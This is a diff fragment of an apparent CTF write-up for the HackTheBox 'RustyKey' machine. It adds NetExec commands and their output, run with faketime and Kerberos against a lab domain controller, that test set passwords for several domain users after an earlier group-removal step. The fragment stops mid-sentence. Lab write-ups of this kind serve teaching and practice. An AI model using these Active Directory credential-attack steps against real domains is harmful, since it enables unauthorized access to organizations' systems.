@@ -280,6 +280,26 @@ Clock skew detected. Adjusting local time by 7:59:58.816041. Retrying operation.
 
 Now they should be removed from the group
 
+```python
+❯❯❯ faketime -f +8h nxc ldap dc.rustykey.htb -u 'bb.morgan' -p 'Password123!' -k
+LDAP        dc.rustykey.htb 389    DC               [*] None (name:DC) (domain:rustykey.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc.rustykey.htb 389    DC               [+] rustykey.htb\bb.morgan:Password123!
+```
+
+I can auth as `bb.morgan`
+
+```python
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'ee.reed' -p 'Password123!' -k 
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\ee.reed:Password123! STATUS_LOGON_TYPE_NOT_GRANTED
+
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'gg.anderson' -p 'Password123!' -k
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [-] rustykey.htb\gg.anderson:Password123! KDC_ERR_CLIENT_REVOKED
+```
+
+However the other two users still show errors, `gg.anderson` is failing becuause the account is disabled, but i have no 
+
 
 
 
